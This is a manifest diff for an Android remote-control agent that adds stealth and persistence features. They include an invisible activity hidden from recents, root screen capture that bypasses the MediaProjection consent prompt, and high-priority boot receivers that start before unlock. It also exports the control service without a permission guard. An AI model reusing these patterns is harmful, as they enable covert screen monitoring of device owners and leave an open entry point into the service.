@@ -18,6 +18,10 @@
     <!-- Boot completed for auto-start -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     
+    <!-- ENTERPRISE: Exact alarms for watchdog (Android 12+) -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+    
     <!-- System alert for overlay (optional) -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     
@@ -65,12 +69,29 @@
             </intent-filter>
         </activity>
 
+        <!-- ENTERPRISE: Invisible Activity для автозапуска (fallback) -->
+        <activity
+            android:name=".AutoStartActivity"
+            android:enabled="true"
+            android:exported="false"
+            android:theme="@android:style/Theme.NoDisplay"
+            android:excludeFromRecents="true"
+            android:launchMode="singleInstance"
+            android:noHistory="true"
+            android:directBootAware="true" />
+
         <!-- Foreground Service for Screen Capture & Connection -->
         <service
             android:name=".service.AgentService"
             android:enabled="true"
-            android:exported="false"
-            tools:ignore="ForegroundServiceType" />
+            android:exported="true"
+            android:directBootAware="true"
+            android:foregroundServiceType="specialUse"
+            tools:ignore="ForegroundServiceType">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="remote_device_control" />
+        </service>
 
         <!-- Foreground Service: MediaProjection (захват экрана + WS) -->
         <service
@@ -80,21 +101,56 @@
             android:foregroundServiceType="mediaProjection"
             tools:ignore="ForegroundServiceType" />
 
+        <!-- ROOT Screen Capture: работает БЕЗ MediaProjection permission! -->
+        <service
+            android:name=".service.RootScreenCaptureService"
+            android:enabled="true"
+            android:exported="false"
+            tools:ignore="ForegroundServiceType" />
+
+        <!-- ENTERPRISE: Boot Job Service - гарантированный автозапуск через JobScheduler -->
+        <service
+            android:name=".service.BootJobService"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
         <!-- Boot Receiver for Auto-Start and OTA Updates -->
+        <!-- ENTERPRISE: directBootAware=true для запуска ДО разблокировки экрана! -->
         <receiver
             android:name=".receiver.BootReceiver"
             android:enabled="true"
-            android:exported="true">
-            <intent-filter>
+            android:exported="true"
+            android:directBootAware="true">
+            
+            <!-- ГЛАВНЫЙ intent-filter с ВЫСОКИМ приоритетом -->
+            <intent-filter android:priority="1000">
+                <!-- Стандартный Android boot -->
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <!-- Android 7+ Direct Boot - срабатывает РАНЬШЕ! -->
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <!-- Quick Boot для эмуляторов -->
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <!-- КРИТИЧНО: Автозапуск после OTA обновления -->
+                <!-- HTC Quick Boot -->
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <!-- LDPlayer/Nox/Bluestacks специфичные -->
+                <action android:name="android.intent.action.ACTION_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.REBOOT" />
+                <!-- После OTA обновления -->
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
             </intent-filter>
+            
             <!-- Для legacy совместимости -->
-            <intent-filter>
+            <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.PACKAGE_REPLACED" />
                 <data android:scheme="package" />
+            </intent-filter>
+            
+            <!-- User present - когда экран разблокирован -->
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.USER_UNLOCKED" />
             </intent-filter>
         </receiver>
 
@@ -131,6 +187,16 @@
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_paths" />
         </provider>
+
+        <!-- ENTERPRISE: Boot ContentProvider - запускается ОЧЕНЬ РАНО! -->
+        <!-- ContentProvider.onCreate() вызывается раньше Application.onCreate() -->
+        <!-- Это ГАРАНТИРУЕТ запуск при любом обращении к приложению -->
+        <provider
+            android:name=".provider.BootContentProvider"
+            android:authorities="${applicationId}.boot"
+            android:enabled="true"
+            android:exported="false"
+            android:initOrder="9999" />
 
     </application>
 
